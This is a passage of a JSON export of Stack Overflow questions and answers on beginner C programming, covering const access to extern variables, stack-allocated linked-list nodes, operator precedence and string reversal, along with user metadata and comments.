"https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": false, "score": 1, "last_activity_date": 1524700508, "creation_date": 1524700508, "answer_id": 50032877, "question_id": 50032318, "link": "https://stackoverflow.com/questions/50032318/can-i-let-a-c-function-use-external-variables-without-letting-it-modify-them/50032877#50032877", "title": "Can I let a C function use external variables, without letting it modify them?", "body": "<h1>Method One: Const Copy</h1>\n\n<pre><code>#define HorribleHackStart(Type, Name) \\\n    Type HorribleHackTemp = Name; { const Type Name = HorribleHackTemp;\n\n#define HorribleHackEnd \\\n    }\n\nint foo(void)\n{\n    HorribleHackStart(int, x)\n    ... Here x is an unchanging const copy of extern x.\n    ... Changes made to x (by other code) will not ge visible.\n    HorribleHackEnd\n}\n</code></pre>\n\n<h1>Method Two: Pointer</h1>\n\n<pre><code>int foo(void)\n{\n    #define x (* (const int *) &amp;x)\n    ... Here x is effectively a const reference to extern x.\n    ... Changes made to x (by other code) will be visible.\n    #undef x\n}\n</code></pre>\n\n<h1>Comments</h1>\n\n<p>I would not use either of these in production code, but they might be useful if you wanted to compile the code to test for violations of the const requirement for x inside the function.</p>\n"}], "owner": {"reputation": 379, "user_id": 1991502, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1883e91ac7aca1b3b90581ba0c70b521?s=128&d=identicon&r=PG", "display_name": "DJames", "link": "https://stackoverflow.com/users/1991502/djames"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524700508, "creation_date": 1524696102, "question_id": 50032318, "link": "https://stackoverflow.com/questions/50032318/can-i-let-a-c-function-use-external-variables-without-letting-it-modify-them", "title": "Can I let a C function use external variables, without letting it modify them?", "body": "<p>If I have a global variable \"x\" used by a C function</p>\n\n<pre><code>int foo() {\n\n    extern int x;\n\n    return x;\n\n}\n</code></pre>\n\n<p>Can I forbid foo from modifying x? I.e. treat x the same way the alternative below would?</p>\n\n<pre><code>int foo(const int x) {\n\n    return x;\n\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12097, "user_id": 1080064, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/100000753306178/picture?type=large", "display_name": "tkausl", "link": "https://stackoverflow.com/users/1080064/tkausl"}, "edited": false, "score": 1, "creation_date": 1524696141, "post_id": 50032313, "comment_id": 87080681, "body": "<code>*string</code> never changes."}, {"owner": {"reputation": 2460, "user_id": 2715819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865993e49f832e0d08673bb6ae8f24b7?s=128&d=identicon&r=PG", "display_name": "RishiG", "link": "https://stackoverflow.com/users/2715819/rishig"}, "edited": false, "score": 0, "creation_date": 1524696244, "post_id": 50032313, "comment_id": 87080719, "body": "yep.  you&#39;re just checking the first character"}], "answers": [{"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": true, "score": 0, "last_activity_date": 1524696400, "creation_date": 1524696400, "answer_id": 50032365, "question_id": 50032313, "link": "https://stackoverflow.com/questions/50032313/finding-the-index-of-a-char-in-c-using-pointers/50032365#50032365", "title": "Finding the index of a char in C using pointers", "body": "<p>You loop does not increment <code>string</code> and always returns after doing the first comparison, you want</p>\n\n<pre><code>int firstVowel(char* string) {\n    //Variable for case with no vowels\n    int notInString = -1;\n    int length = strlen(string);\n    int i;\n    for (i = 0; i &lt;= length; i += 1) {\n        if (*string == 'a' || *string == 'e' || *string == 'i' ||\n            *string == 'o' || *string == 'u') {\n            return i;\n        } else {\n            string++;\n        }\n    }\n\n    return notInString;\n}\n</code></pre>\n\n<p>This will search the entire array, returning the index of the first vowel it sees.  It cannot return <code>notInString</code> until it has processed the entire string.</p>\n"}], "owner": {"reputation": 75, "user_id": 9591067, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cl1h9.png?s=128&g=1", "display_name": "Walker", "link": "https://stackoverflow.com/users/9591067/walker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "accepted_answer_id": 50032365, "answer_count": 1, "score": 1, "last_activity_date": 1524698526, "creation_date": 1524696036, "question_id": 50032313, "link": "https://stackoverflow.com/questions/50032313/finding-the-index-of-a-char-in-c-using-pointers", "title": "Finding the index of a char in C using pointers", "body": "<p>I'm having difficulties with a program I've been instructed to write. The program should search a word for the first vowel that appears, it then should print out the index of that vowel. If there are no vowel's, it should return -1.</p>\n\n<p>This is my code so far:</p>\n\n<pre><code>int firstVowel(char* string){\n//Variable for case with no vowels\nint notInString = -1;\nint length = strlen(string);\nint i;\nfor(i = 0; i &lt;= length; i+=1){\n    if(*string == 'a' || *string == 'e' || *string == 'i' ||\n    *string == 'o' || *string == 'u'){\n        return i;\n    }\nelse if(*string != 'a' || *string != 'e' || *string != 'i' || *string != 'o' ||\n*string != 'u') {\n    return notInString;\n}\n}\n}\n</code></pre>\n\n<p>When I run it with the input \"abced\" it returns 0 correctly. However, when I run it as fsed it returns -1 incorrectly.</p>\n"}, {"tags": ["c", "doubly-linked-list"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 4, "creation_date": 1524695567, "post_id": 50032224, "comment_id": 87080528, "body": "<code>Node node = {data, NULL, NULL};</code> is in automatic storage. (&quot;the stack&quot;) it goes out of scope once the function returns."}, {"owner": {"reputation": 130214, "user_id": 772035, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/jAEqI.jpg?s=128&g=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/772035/paul"}, "edited": false, "score": 2, "creation_date": 1524695603, "post_id": 50032224, "comment_id": 87080539, "body": "In <code>push_node</code> you are creating the new Node on the stack, after <code>push_node</code> returns that memory is no longer readable without invoking undefined behaviour."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 3, "creation_date": 1524695878, "post_id": 50032224, "comment_id": 87080611, "body": "read the other 100 questions about how to make a linked list in C."}, {"owner": {"reputation": 2858, "user_id": 4070218, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/VNOHi.gif?s=128&g=1", "display_name": "jonny", "link": "https://stackoverflow.com/users/4070218/jonny"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524696591, "post_id": 50032224, "comment_id": 87080853, "body": "@Stargateur none of the questions I read on doubly linked lists explicitly mentioned that <code>malloc</code> or <code>calloc</code> were necessary for an implementation of a linked list - there&#39;s no need to be actively disencouraging. I wrote this code, it didn&#39;t work, I asked for help, I&#39;m sorry for the inconvenience(!)"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1524698999, "post_id": 50032224, "comment_id": 87081511, "body": "@jonny well, to be fair, how many of those other questions did not malloc the new nodes?"}, {"owner": {"reputation": 130214, "user_id": 772035, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/jAEqI.jpg?s=128&g=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/772035/paul"}, "edited": false, "score": 0, "creation_date": 1524699055, "post_id": 50032224, "comment_id": 87081531, "body": "<code>malloc</code> and <code>calloc</code> are not necessary. You can create the nodes the way you are doing it, you just have to do it higher up in the stack. EG. in <code>main</code>."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 130214, "user_id": 772035, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/jAEqI.jpg?s=128&g=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/772035/paul"}, "edited": false, "score": 1, "creation_date": 1524699648, "post_id": 50032224, "comment_id": 87081669, "body": "@Paulpro true enough, though I would imagine it&#39;s difficult to think up an application scenario where that would be useful.  Maybe to add sentinel nodes."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1524701639, "post_id": 50032224, "comment_id": 87082115, "body": "<a href=\"https://stackoverflow.com/a/39618642/905902\">stackoverflow.com/a/39618642/905902</a> It is possible to use linked lists without malloc/free. It is even possible without pointers inside the nodes."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1524701855, "post_id": 50032224, "comment_id": 87082179, "body": "@wildplasser the &#39;backing array&#39; indices are base pointers and offsets.  Still pointers:)"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1524702088, "post_id": 50032224, "comment_id": 87082230, "body": "I cannot find the pointerless version  now, maybe I&#39;ll add a link tomorrow.  (comes in handy when the table is in shared memory or memmapped, or even on disk) There you go: <a href=\"http://stackoverflow.com/questions/8059591/lookups-on-known-set-of-integer-keys\" title=\"lookups on known set of integer keys\">stackoverflow.com/questions/8059591/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1524696928, "post_id": 50032268, "comment_id": 87080949, "body": "what if <code>head</code> is NULL ?"}, {"owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1524697198, "post_id": 50032268, "comment_id": 87081032, "body": "A good point, but that is a second issue, unrelated to the question asked here, and not possible to hit given the OP&#39;s current code (he initializes the list in main with a single node).  While I agree it is not good code, again, it is not related to the question he asked.  So feel free to add your own answer if you wish to expand on what his code should ultimately be doing."}], "tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 1, "last_activity_date": 1524695784, "creation_date": 1524695784, "answer_id": 50032268, "question_id": 50032224, "link": "https://stackoverflow.com/questions/50032224/walking-through-doubly-linked-list-runs-forever-despite-apparent-null-terminato/50032268#50032268", "title": "Walking through doubly linked list runs forever (despite apparent NULL terminator)", "body": "<p>You cannot create the node in this fashion</p>\n\n<pre><code>Node node = { data, NULL, NULL };\n</code></pre>\n\n<p>It will create the node using stack memory, which will be deallocated once the function returns.  You need to use <code>malloc()</code> to allocate heap memory.</p>\n\n<pre><code>void push_node(Node* head, int data) {\n    Node *node = malloc(sizeof(*node));\n    if (node == NULL) {\n        printf(\"memory error\\n\");\n        return;\n    }\n    node-&gt;data = data;\n    node-&gt;next = node-&gt;prev = NULL;\n\n    Node* cursor = head;\n    while (cursor-&gt;next != NULL) {\n        cursor = cursor-&gt;next;\n    }\n    cursor-&gt;next = node;     // note the changes here\n    node-&gt;prev = cursor;     //\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3854, "user_id": 2235885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09d0d6a08639ef79ef960a52bd013e02?s=128&d=identicon&r=PG", "display_name": "joop", "link": "https://stackoverflow.com/users/2235885/joop"}, "edited": false, "score": 0, "creation_date": 1524746482, "post_id": 50032311, "comment_id": 87102460, "body": "Last time I checked, <code>calloc()</code> took <i>two</i> arguments."}, {"owner": {"reputation": 787, "user_id": 6715227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NB84a.png?s=128&g=1", "display_name": "stetoc", "link": "https://stackoverflow.com/users/6715227/stetoc"}, "reply_to_user": {"reputation": 3854, "user_id": 2235885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09d0d6a08639ef79ef960a52bd013e02?s=128&d=identicon&r=PG", "display_name": "joop", "link": "https://stackoverflow.com/users/2235885/joop"}, "edited": false, "score": 0, "creation_date": 1524751687, "post_id": 50032311, "comment_id": 87106455, "body": "@joop yeah, my bad, haven&#39;t programmed in C for a while, it doesn&#39;t take overall buffer size but size of single elem and count of elems"}], "tags": [], "owner": {"reputation": 787, "user_id": 6715227, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NB84a.png?s=128&g=1", "display_name": "stetoc", "link": "https://stackoverflow.com/users/6715227/stetoc"}, "is_accepted": false, "score": 0, "last_activity_date": 1524751712, "last_edit_date": 1524751712, "creation_date": 1524696024, "answer_id": 50032311, "question_id": 50032224, "link": "https://stackoverflow.com/questions/50032224/walking-through-doubly-linked-list-runs-forever-despite-apparent-null-terminato/50032311#50032311", "title": "Walking through doubly linked list runs forever (despite apparent NULL terminator)", "body": "<p>instead of creating local variables in push function you should use dynamically allocated memory, use <code>malloc</code> to allocate &amp; <code>free</code> to free it before exiting from main, or even better you could use <code>calloc</code>, works same as malloc but fills allocated memory with zeros so you dont have to care about filling nulls, proof of concept:</p>\n\n<pre><code>void push_node(Node* head, int data){\n    Node* node = calloc(sizeof(Node), 1);\n    node-&gt;data = data;\n    Node* cursor = head;\n    while(cursor-&gt;next != NULL) {       \n        cursor = cursor-&gt;next;\n    }\n    cursor-&gt;next = node;\n    node-&gt;prev = cursor;\n}\n</code></pre>\n\n<p>and in your main before return you should free allocated memory, function should be similar to your <code>print</code> function but instead of printing data you need to free given element until you get to end, proof of concept:</p>\n\n<pre><code>void free_list(Node* head){\n   if(head){\n       free_list(head-&gt;next);\n       free(head);\n   }\n}\n</code></pre>\n\n<p>call <code>free_list</code> on your list before exiting</p>\n"}, {"tags": [], "owner": {"reputation": 2721, "user_id": 8767209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f22597b536b07b41525099a8c16e23ce?s=128&d=identicon&r=PG&f=1", "display_name": "MFisherKDX", "link": "https://stackoverflow.com/users/8767209/mfisherkdx"}, "is_accepted": true, "score": 4, "last_activity_date": 1524697111, "last_edit_date": 1524697111, "creation_date": 1524696466, "answer_id": 50032377, "question_id": 50032224, "link": "https://stackoverflow.com/questions/50032224/walking-through-doubly-linked-list-runs-forever-despite-apparent-null-terminato/50032377#50032377", "title": "Walking through doubly linked list runs forever (despite apparent NULL terminator)", "body": "<p>Your code does not work because <code>Node node = { data, NULL, NULL };</code> creates a local variable <code>node</code> scoped to the function <code>push_node</code>.  Once that function returns, you are using the address of a local out of scope which is undefined behavior.  Instead, use <code>malloc</code> or <code>calloc</code> to allocate space for the Node.</p>\n\n<p>Additionally, your <code>push_node</code> function does not correctly handle the case when the <code>head</code> pointer is NULL.  There are several fixes for this.  One way is to check for NULL, and if so, return the new pointer as the new <code>head</code>.</p>\n\n<p>Also, you should write a function to delete your list when done.</p>\n\n<pre><code>Node *push_node(Node* head, int data) \n{  \n    Node *node = malloc(sizeof(*node));\n    node-&gt;data = data;\n    node-&gt;prev = node-&gt;next = NULL;\n    Node* cursor = head;\n    if (cursor == NULL)\n    {\n        head = node;\n    }\n    else\n    {\n        while(cursor-&gt;next != NULL) {       \n            cursor = cursor-&gt;next;\n        }\n        cursor-&gt;next = node;\n        node-&gt;prev = cursor;\n    }\n    return head; \n}   \n\nvoid free_list(Node *head) {\n    if(head != NULL)\n    {\n        Node *next = head-&gt;next;\n        free(head);\n        head = next;\n    }\n}\n\nint main()  {\n    Node *root = NULL;\n    root = push_node(root, 1);\n    root = push_node(root, 2);\n    print_list(root);\n    free_list(root);\n    return 0; \n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "reply_to_user": {"reputation": 2721, "user_id": 8767209, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f22597b536b07b41525099a8c16e23ce?s=128&d=identicon&r=PG&f=1", "display_name": "MFisherKDX", "link": "https://stackoverflow.com/users/8767209/mfisherkdx"}, "edited": false, "score": 1, "creation_date": 1524696708, "post_id": 50032386, "comment_id": 87080892, "body": "@MFisherKDX I think, it&#39;s the user stefoc, who downvote everything. This answer is the only one funny ;) but you should use for loop it&#39;s more idiomatic to iterate."}], "tags": [], "owner": {"reputation": 130214, "user_id": 772035, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/jAEqI.jpg?s=128&g=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/772035/paul"}, "is_accepted": false, "score": 1, "last_activity_date": 1524696512, "creation_date": 1524696512, "answer_id": 50032386, "question_id": 50032224, "link": "https://stackoverflow.com/questions/50032224/walking-through-doubly-linked-list-runs-forever-despite-apparent-null-terminato/50032386#50032386", "title": "Walking through doubly linked list runs forever (despite apparent NULL terminator)", "body": "<p>In <code>push_node</code> you are creating the new Node on the stack, after <code>push_node</code> returns that memory is no longer readable without invoking undefined behaviour (infinite loops included). You could use <code>malloc</code> inside <code>push_node</code> but you probably shouldn't unless you're create a huge list. You would also need to keep track of the memory and <code>free</code> it properly later. If you're not making a massive list you can just create your nodes in <code>main</code> instead, with minimal changes to your code:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\ntypedef struct Node {\n    int data;\n    struct Node* prev;\n    struct Node* next;\n} Node;\n\nvoid print_list(Node* head) {\n    Node* cursor = head;\n    while(cursor != NULL) {\n        printf(\"data: %d\\n\", cursor-&gt;data);\n        cursor = cursor-&gt;next;\n    }   \n}\n\nvoid push_node(Node* head, Node* new) {\n    Node* cursor = head;\n    while(cursor-&gt;next != NULL) {    \n        cursor = cursor-&gt;next;\n    }   \n    cursor-&gt;next = new;                                                                                                                               \n    new-&gt;prev = cursor;\n}\n\nint main() {\n    Node root = {0,NULL,NULL};\n    push_node(&amp;root, &amp;(Node){ 1, NULL, NULL }); \n    push_node(&amp;root, &amp;(Node){ 2, NULL, NULL }); \n    print_list(&amp;root);\n    return 0;\n}\n</code></pre>\n\n<p>If your list is massive then you should use malloc anyway, but you wouldn't want to call it every time you create a new node, instead you might allocate a large enough amount of memory to hold a large list in one call to malloc, and then realloc it to be twice as large if your list grows to the point where you need more memory for it.</p>\n"}, {"tags": [], "owner": {"reputation": 3971, "user_id": 2840714, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/s9vli.jpg?s=128&g=1", "display_name": "ChuckCottrill", "link": "https://stackoverflow.com/users/2840714/chuckcottrill"}, "is_accepted": false, "score": 0, "last_activity_date": 1524700330, "creation_date": 1524700330, "answer_id": 50032853, "question_id": 50032224, "link": "https://stackoverflow.com/questions/50032224/walking-through-doubly-linked-list-runs-forever-despite-apparent-null-terminato/50032853#50032853", "title": "Walking through doubly linked list runs forever (despite apparent NULL terminator)", "body": "<p>The program runs forever because your call to push node places the Node declared on the stack onto the list twice. You are using two names for the same thing,</p>\n\n<pre><code>cursor-&gt;next = &amp;node;\n</code></pre>\n\n<p>points to the stack node, and creates the conditions for the infinite loop. Which happens after the second call to this loop (in push_node).</p>\n\n<pre><code>while(cursor-&gt;next != NULL) {\n    printf(\"ptr: %p -&gt; %p\\n\",cursor,cursor-&gt;next); //add this\n    cursor = cursor-&gt;next;\n}\n</code></pre>\n\n<p>Add to your debug print the pointer value and you will see what is happening,</p>\n\n<pre><code>while(cursor != NULL) {\n    printf(\"ptr: %p, data: %d\\n\",cursor,cursor-&gt;data); //change this\n    cursor = cursor-&gt;next;\n}\n</code></pre>\n\n<p>.</p>\n"}], "owner": {"reputation": 2858, "user_id": 4070218, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/VNOHi.gif?s=128&g=1", "display_name": "jonny", "link": "https://stackoverflow.com/users/4070218/jonny"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 50032377, "answer_count": 5, "score": -1, "last_activity_date": 1524751712, "creation_date": 1524695396, "last_edit_date": 1524699639, "question_id": 50032224, "link": "https://stackoverflow.com/questions/50032224/walking-through-doubly-linked-list-runs-forever-despite-apparent-null-terminato", "title": "Walking through doubly linked list runs forever (despite apparent NULL terminator)", "body": "<p>My implementation of a <code>C</code> doubly linked list doesn't seem to work correctly. I fear it may be due to my cursory knowledge of pointers in <code>C</code> (coming from the blissful ignorance of interpreted languages). When I run this code, it seems <code>print_list()</code> runs forever, even though it <em>should</em> be terminated by the <code>next</code> field being <code>NULL</code>.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\ntypedef struct Node {\n    int data;\n    struct Node* prev;\n    struct Node* next;\n} Node;\n\nvoid print_list(Node* head) {\n    Node* cursor = head;\n    while(cursor != NULL) {\n        printf(\"data: %d\\n\", cursor-&gt;data);\n        cursor = cursor-&gt;next;\n    }\n}\n\nvoid push_node(Node* head, int data) {  \n    Node node = {data, NULL, NULL};\n    Node* cursor = head;\n    while(cursor-&gt;next != NULL) {       \n        cursor = cursor-&gt;next;\n    }\n    cursor-&gt;next = &amp;node;\n    node.prev = cursor;\n}\n\nint main() {\n    Node root = {0, NULL, NULL};\n    push_node(&amp;root, 1);\n    push_node(&amp;root, 2);\n    print_list(&amp;root);\n    return 0;\n}\n</code></pre>\n\n<p>What am I doing wrong?? Any help would be much appreciated.</p>\n"}, {"tags": ["c", "string", "reverse"], "answers": [{"tags": [], "owner": {"reputation": 2460, "user_id": 2715819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865993e49f832e0d08673bb6ae8f24b7?s=128&d=identicon&r=PG", "display_name": "RishiG", "link": "https://stackoverflow.com/users/2715819/rishig"}, "is_accepted": false, "score": 3, "last_activity_date": 1524695883, "creation_date": 1524695883, "answer_id": 50032284, "question_id": 50032213, "link": "https://stackoverflow.com/questions/50032213/setting-a-value-to-a-function-in-c/50032284#50032284", "title": "Setting a value to a function in C", "body": "<p>It's a <code>c</code> <a href=\"http://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">operator precedence</a> thing.  Since relation (<code>&gt;</code>) has higher precedence than assignment (<code>=</code>), it is evaluated first, so you are assigning the value <code>True</code> (or <code>1</code>) to the variable <code>len</code>.  Try putting the assignment in parentheses:</p>\n\n<pre><code>while((len = ngetline(line, MAXLENGTH)) &gt; 0)\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 5696926, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208491229187122/picture?type=large", "display_name": "BlankQQ", "link": "https://stackoverflow.com/users/5696926/blankqq"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 154, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1524695883, "creation_date": 1524695316, "question_id": 50032213, "link": "https://stackoverflow.com/questions/50032213/setting-a-value-to-a-function-in-c", "title": "Setting a value to a function in C", "body": "<p>I am trying to do a reverse String problem in C and I am aware that there are other ways to do this but I am confused as to why the following solution is not working. (I'll put the output below)</p>\n\n<pre><code>/*Write a function reverse (s) that reverses the character strings. Use it to write a program that reverses its input a line at a time*/\n#include &lt;stdio.h&gt;\n#define MAXLENGTH 1000\n\nint ngetline(char s[], int lim);\nvoid nreverse(char s[], int index);\n\nmain(){\n    int len;\n    char line[MAXLENGTH];\n\n    while(len = ngetline(line, MAXLENGTH) &gt; 0)\n    {\n        printf(\"length: %d\\n\", len);\n        nreverse(line, len);\n    }\n\n    printf(\"%s\", line);\n\n    return 0;\n\n}\n\n\nint ngetline(char s[], int lim)\n{\n    int c;\n    int i;\n    for(i = 0; i &lt;  lim -1 &amp;&amp; (c = getchar()) != EOF &amp;&amp; c != '\\n'; ++i)\n    {\n        s[i] = c;\n    }\n\n    if(c == '\\n')\n    {\n        s[i] = c;\n        ++i;\n    }\n\n    s[i] = '\\0';\n    printf(\"i: %d\\n\", i);\n    return i;\n}\n\n\nvoid nreverse(char s[], int len)\n{\n    int i, backIndex;\n    int halfway;\n    char temp;\n    backIndex = len - 2;\n    halfway = backIndex / 2;\n\n\n\n    for(i = 0; i &lt;= halfway; ++i)\n    {\n        printf(\"In the for\\n\");\n        temp = s[i];\n        s[i] = s[backIndex];\n        s[backIndex] = temp;\n        --backIndex;\n    }\n}\n</code></pre>\n\n<p>Here is the output:</p>\n\n<pre><code>./reverseString\nentering while\nString to be Reversed\ni: 22\nlength: 1\n</code></pre>\n\n<p>As you can see in the code, I set the length equal to the function ngetline() which returns i.  But then when I print/try to get length, it returns 1.  Does anyone know why this is happening?  Thanks.</p>\n"}, {"tags": ["c", "string", "pointers"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524690634, "post_id": 50031360, "comment_id": 87078850, "body": "You are not setting the <code>&#39;\\0&#39;</code>-terminating byte for <code>string2</code>."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 2, "creation_date": 1524690772, "post_id": 50031360, "comment_id": 87078900, "body": "Add <code>void reverse2(char* string, char* string2);</code> before <code>main</code> to get rid of the warning."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1524691173, "post_id": 50031360, "comment_id": 87079081, "body": "One option would be to write the whole <code>reverse2</code> function before <code>main</code>. But some times it is not as easy as that, for example with cycling dependencies or when you are using a function from another compile unit. The line I suggested is called a function prototype, it&#39;s basically telling the compiler &quot;hey, there is a function called <code>reverse2</code> that takes to pointers to <code>char</code>&quot;. So even if the compiler hasn&#39;t seen the code of the function, by the time it reaches it&#39;s first call, it already knows if the arguments match the specification."}, {"owner": {"reputation": 18851, "user_id": 414813, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/83284c54c3fc960dcdf8844ed92227d7?s=128&d=identicon&r=PG", "display_name": "CAFxX", "link": "https://stackoverflow.com/users/414813/cafxx"}, "edited": false, "score": 1, "creation_date": 1524691282, "post_id": 50031360, "comment_id": 87079130, "body": "For the record, you don&#39;t need <code>malloc</code> at all to solve this problem. I&#39;m pretty sure your professor will grade the answer higher if you do the reverse in place."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1524692388, "post_id": 50031360, "comment_id": 87079560, "body": "Try something <a href=\"https://ideone.com/RfUcwe\" rel=\"nofollow noreferrer\">Like This</a>."}, {"owner": {"reputation": 3971, "user_id": 2840714, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/s9vli.jpg?s=128&g=1", "display_name": "ChuckCottrill", "link": "https://stackoverflow.com/users/2840714/chuckcottrill"}, "reply_to_user": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": 